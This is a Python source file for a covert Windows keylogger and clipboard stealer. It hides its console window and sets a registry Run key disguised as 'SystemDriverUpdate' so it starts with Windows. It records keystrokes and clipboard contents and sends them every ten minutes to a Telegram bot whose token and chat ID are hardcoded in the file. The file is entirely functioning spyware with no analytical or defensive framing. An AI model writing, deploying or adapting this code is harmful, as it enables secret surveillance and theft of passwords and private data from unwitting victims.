import os, sys, time, threading, requests, pyperclip, winreg
from pynput import keyboard

# ==========================================
# CONFIGURATION
BOT_TOKEN = "8723448863:AAHrndQJbtHoDkw7GqavfCfqpp0bLSRLkwA"
CHAT_ID = "5515529017"
# ==========================================

API_MSG = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
API_FILE = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

log_buffer = ""
clipboard_buffer = ""
last_clip = ""

def stealth_mode():
    """Hides the console window on Windows"""
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel.GetConsoleWindow(), 0)

def set_autostart():
    """Ensures it starts on PC reboot"""
    try:
        app_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemDriverUpdate", 0, winreg.REG_SZ, f'"{app_path}"')
        winreg.CloseKey(key)
    except: pass

def send_to_tg():
    global log_buffer, clipboard_buffer
    while True:
        time.sleep(600) # Send every 10 minutes
        content = f"--- KEYLOGS ---\n{log_buffer}\n\n--- CLIPBOARD ---\n{clipboard_buffer}"
        if content.strip():
            try:
                with open("sys_log.txt", "w", encoding="utf-8") as f:
                    f.write(content)
                with open("sys_log.txt", "rb") as f:
                    requests.post(API_FILE, data={"chat_id": CHAT_ID}, files={"document": f})
                log_buffer = ""
                clipboard_buffer = ""
                os.remove("sys_log.txt")
            except: pass

def on_press(key):
    global log_buffer
    try:
        log_buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space: log_buffer += " "
        elif key == keyboard.Key.enter: log_buffer += "\n"

def check_clipboard():
    global clipboard_buffer, last_clip
    while True:
        try:
            current_clip = pyperclip.paste()
            if current_clip != last_clip:
                clipboard_buffer += f"[{time.ctime()}] {current_clip}\n"
                last_clip = current_clip
        except: pass
        time.sleep(5)

if __name__ == "__main__":
    stealth_mode()
    set_autostart()
    
    # Start threads
    threading.Thread(target=send_to_tg, daemon=True).start()
    threading.Thread(target=check_clipboard, daemon=True).start()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()